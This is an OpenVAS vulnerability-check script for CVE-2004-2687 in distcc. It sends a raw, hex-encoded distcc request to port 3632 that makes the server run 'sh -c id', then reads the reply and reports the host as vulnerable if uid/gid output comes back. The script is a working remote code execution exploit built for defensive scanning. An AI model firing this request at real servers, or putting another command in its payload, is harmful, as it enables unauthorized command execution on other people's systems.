###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_distcc_cve_2004_2687.nasl 12 2013-10-27 11:15:33Z jan $
#
# distcc Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "distcc 2.x, as used in XCode 1.5 and others, when not configured to restrict
access to the server port, allows remote attackers to execute arbitrary
commands via compilation jobs, which are executed by the server without
authorization checks.";

tag_solution = "Vendor updates are available. Please see the references for more
information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103553";

if (description)
{
 script_oid(SCRIPT_OID);
 script_cve_id("CVE-2004-2687");
 script_tag(name:"cvss_base", value:"9.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 12 $");

 script_name("distcc Remote Code Execution Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://distcc.samba.org/security.html");
 script_xref(name : "URL" , value : "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2004-2687");
 script_xref(name : "URL" , value : "http://www.osvdb.org/13378");
 script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2005-03/0183.html");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-08-23 16:02:21 +0200 (Thu, 23 Aug 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to execute the id command");
 script_category(ACT_ATTACK);
 script_family("General");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports(3632);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

port = 3632;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(!soc) exit(0);

req = raw_string(
0x44,0x49,0x53,0x54,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x31,0x41,0x52,0x47,0x43,
0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x38,0x41,0x52,0x47,0x56,0x30,0x30,0x30,0x30,
0x30,0x30,0x30,0x32,0x73,0x68,0x41,0x52,0x47,0x56,0x30,0x30,0x30,0x30,0x30,0x30,
0x30,0x32,0x2d,0x63,0x41,0x52,0x47,0x56,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x32)
+ 'id' +
raw_string(0x41,0x52,0x47,0x56,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x31,0x23,0x41,
0x52,0x47,0x56,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x32,0x2d,0x63,0x41,0x52,0x47,
0x56,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x36,0x6d,0x61,0x69,0x6e,0x2e,0x63,0x41,
0x52,0x47,0x56,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x32,0x2d,0x6f,0x41,0x52,0x47,
0x56,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x36,0x6d,0x61,0x69,0x6e,0x2e,0x6f,0x44,
0x4f,0x54,0x49,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x41,0x57,0x4a,0x79,0x55,0x31,
0x6e,0x70,0x6f,0x62,0x76,0x0a);

send(socket:soc, data:req);
recv = recv(socket:soc, length:512); 

if(recv =~ "uid=[0-9]+.*gid=[0-9]+") {
  security_hole(port:port);
  exit(0);

}

exit(0);
